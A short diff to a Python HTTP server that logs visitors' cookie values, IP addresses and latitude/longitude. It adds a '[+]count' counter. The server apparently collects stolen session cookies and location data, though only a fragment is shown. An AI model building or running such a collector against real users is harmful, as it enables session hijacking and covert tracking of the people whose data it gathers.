@@ -1,7 +1,7 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
 import datetime
-
+i = 0
 # 定义一个处理请求的类
 class MyHTTPRequestHandler(BaseHTTPRequestHandler):
 
@@ -32,6 +32,12 @@ class MyHTTPRequestHandler(BaseHTTPRequestHandler):
 
                 # 记录日志
                 log_entry = f"{datetime.datetime.now()}\n Cookie: {cookie_value},\n IP: {ip_address},\n Latitude: {latitude},\n Longitude: {longitude}\n\n"
+                global i
+                i += 1
+                print()
+                print(
+                    f"[+]count {i}"
+                )
                 print(log_entry)
                 self.write_to_log(log_entry)
 
